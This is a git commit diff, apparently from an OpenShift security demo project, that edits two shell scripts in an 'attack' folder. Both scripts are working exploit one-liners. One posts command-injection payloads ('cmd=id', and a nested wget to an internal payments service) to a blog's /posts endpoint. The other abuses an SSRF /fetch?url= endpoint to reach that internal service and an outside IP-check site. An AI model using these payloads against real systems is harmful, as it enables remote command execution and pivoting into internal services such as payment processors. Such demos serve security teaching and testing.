a62368061798bafae4776562c81ace0eb814489d
Rodrigo Alvares <ralvares@redhat.com>
2023-06-14 13:59:22 +0200

    Change some expoit scripts

--- attack/zeroday.sh
+++ attack/zeroday.sh
@@ -1,9 +1,3 @@
-if [ $# -eq 0 ]
-then
-echo  "try: ./$0 ip:port"
-exit 1
-fi
+wget -q -O - --post-data 'cmd=id' https://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/posts
 
-wget -q -O - --post-data 'cmd=id' https://$1/posts
-
-echo "Connecting to VISA-PROCESSOR.." && wget -q -O - --post-data 'cmd=wget -O - http://visa-processor-service.payments:8080' https://$1/posts
+echo "Connecting to VISA-PROCESSOR.." && wget -q -O - --post-data 'cmd=wget -O - http://visa-processor-service.payments:8080' https://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/posts
--- attack/zeroday_ssrf.sh
+++ attack/zeroday_ssrf.sh
@@ -1,8 +1,2 @@
-if [ $# -eq 0 ]
-then
-echo  "try: ./$0 ip:port"
-exit 1
-fi
-
-#wget -q -O - http://blog-frontend.apps.ocp.ralvares.com/fetch?url=http://checkip.dyndns.com
-wget -q -O - http://$1/fetch?url=http://visa-processor-service.payments:8080
+wget -q -O - http://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/fetch?url=http://checkip.dyndns.com
+wget -q -O - http://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/fetch?url=http://visa-processor-service.payments:8080
